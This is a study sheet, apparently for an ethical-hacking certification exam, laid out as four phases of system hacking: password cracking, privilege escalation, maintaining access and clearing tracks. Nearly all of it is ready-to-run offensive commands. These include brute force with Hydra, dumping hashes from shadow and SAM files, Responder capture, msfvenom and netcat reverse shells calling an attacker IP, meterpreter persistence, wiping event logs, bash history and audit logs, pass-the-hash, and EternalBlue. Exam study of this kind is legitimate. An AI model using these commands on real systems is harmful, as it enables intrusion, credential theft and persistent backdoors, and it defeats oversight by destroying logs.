## System Hacking

Four phases: Gaining Access → Escalating Privileges → Maintaining Access → Clearing Tracks  

---

## Phase 1: Gaining Access (Password Cracking)

### Types of Password Attacks
- **Online** - active, against live service (slow, can be detected)  
- **Offline** - against captured hash (fast, undetected)  
- **Passive** - sniffing, MITM, shoulder surfing  

### Hydra - Online Brute Force
`hydra -L users.txt -P passwords.txt [ip] ssh` - SSH brute force  
`hydra -l admin -P passwords.txt [ip] ftp` - FTP  
`hydra -l admin -P passwords.txt [ip] rdp` - RDP  
`hydra -l admin -P passwords.txt [ip] smb` - SMB  
`hydra -l admin -P pass.txt [ip] http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` - web form  

### John the Ripper - Offline Hash Cracking
`john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`  
`john --show hashes.txt` - show cracked passwords  
`john --format=NT hashes.txt` - specify hash type (NTLM)  

Extract hashes first:  
`unshadow /etc/passwd /etc/shadow > hashes.txt` - Linux  
`samdump2 SYSTEM SAM > hashes.txt` - Windows SAM  

### Hashcat - GPU Hash Cracking
`hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt` - MD5  
`hashcat -m 1000 hashes.txt rockyou.txt` - NTLM  
`hashcat -m 1800 hashes.txt rockyou.txt` - sha512crypt (Linux)  

Common hash modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt  

### Password Wordlists
`/usr/share/wordlists/rockyou.txt` - most common  
`/usr/share/wordlists/dirb/common.txt`  
`cewl http://target.com -w wordlist.txt` - generate wordlist from website  

### L0phtCrack / ophcrack
- **ophcrack** - Windows password cracker using rainbow tables  
- Load SAM hive → auto-cracks with rainbow tables  
- GUI tool, exam loves it  

### Responder - LLMNR/NBT-NS Poisoning
`responder -I eth0 -wrf` - capture NTLMv2 hashes on LAN  
Then crack captured hash with john/hashcat  

---

## Phase 2: Privilege Escalation

### Linux Privilege Escalation
`sudo -l` - check what current user can run as sudo  
`find / -perm -4000 2>/dev/null` - find SUID binaries  
`cat /etc/crontab` - check cron jobs  
`uname -a` - kernel version (search for kernel exploits)  
`ls -la /etc/passwd` - writable passwd file?  

### Windows Privilege Escalation
`whoami /priv` - check privileges  
`systeminfo` - OS version, hotfixes (search for missing patches)  
`net localgroup administrators` - list admin group members  

### Metasploit Post-Exploitation
```
meterpreter > getuid              → current user  
meterpreter > getsystem           → attempt auto privesc  
meterpreter > run post/multi/recon/local_exploit_suggester  
```

### BeRoot / PowerUp / WinPEAS / LinPEAS
Automated privilege escalation checkers:  
- **WinPEAS**: `winpeas.exe` - Windows privesc enumeration  
- **LinPEAS**: `linpeas.sh` - Linux privesc enumeration  
- **PowerUp** (PowerShell): `Invoke-AllChecks`  

---

## Phase 3: Maintaining Access

### Meterpreter Backdoor
```
meterpreter > run persistence -U -i 5 -p 4444 -r [attacker-ip]  
```
-U = start on user login  
-i = reconnect interval (seconds)  
-p = port  
-r = attacker IP  

### Creating a Payload with msfvenom
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f exe > shell.exe`  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f elf > shell.elf`  
`msfvenom -p php/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f raw > shell.php`  

### Listener Setup
```
msfconsole  
use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp  
set LHOST [attacker ip]  
set LPORT 4444  
exploit  
```

### Netcat Backdoor
Listener: `nc -lvp 4444`  
Reverse shell: `nc [attacker-ip] 4444 -e /bin/bash`  

---

## Phase 4: Clearing Tracks

### Windows
`wevtutil cl System` - clear System logs  
`wevtutil cl Security` - clear Security logs  
`wevtutil cl Application` - clear Application logs  

Or via Meterpreter:  
`meterpreter > clearev` - clears all Windows event logs  

### Linux
`echo "" > /var/log/auth.log` - clear auth log  
`echo "" > /var/log/syslog`  
`echo "" > ~/.bash_history` - clear bash history  
`history -c` - clear current session history  
`shred -zu /var/log/auth.log` - securely delete  

### Disable Auditing
`auditpol /set /category:"system" /success:disable /failure:disable` - Windows  
`service auditd stop` - Linux  

---

## Steganography

### Hide data in images
**OpenStego** (GUI):  
1. Select cover image + secret file  
2. Set output path → Hide Data  

**Snow** (whitespace steganography):  
`snow -C -m "secret message" -p "password" original.txt stego.txt`  
`snow -C -p "password" stego.txt` - extract  

**Steghide**:  
`steghide embed -cf image.jpg -ef secret.txt -p password` - hide  
`steghide extract -sf image.jpg -p password` - extract  
`steghide info image.jpg` - check if data is embedded  

### Detect Steganography
`steghide info image.jpg`  
**StegSpy**, **zsteg**, **binwalk**  
`binwalk image.jpg` - detect embedded files  
`binwalk -e image.jpg` - extract embedded files  

---

## NTLM vs Kerberos Authentication

| Feature | NTLM | Kerberos |
|---------|------|----------|
| Protocol | Challenge-response | Ticket-based |
| Port | - | 88 |
| Encryption | MD4 hash | AES/DES |
| Mutual auth | No | Yes |
| Default in AD | Fallback | Primary |

### Pass the Hash (PtH)
Use NTLM hash without cracking:  
`pth-winexe -U admin%hash //[ip] cmd`  

In Metasploit:  
```
use exploit/windows/smb/psexec  
set SMBPass [LM:NTLM hash]  
set SMBUser administrator  
set RHOSTS [ip]  
exploit  
```

---

## Key Metasploit Commands for Exam

```
search [keyword]          → find modules  
use [module]              → load module  
show options              → see required settings  
set RHOSTS [ip]           → set target  
set LHOST [ip]            → set attacker IP  
exploit / run             → launch  
sessions -l               → list active sessions  
sessions -i [id]          → interact with session  
background                → background current session  
```

### Common Exploit Modules
`exploit/windows/smb/ms17_010_eternalblue` - EternalBlue (Win7/2008)  
`exploit/windows/smb/psexec` - pass the hash  
`exploit/multi/handler` - catch reverse shells  
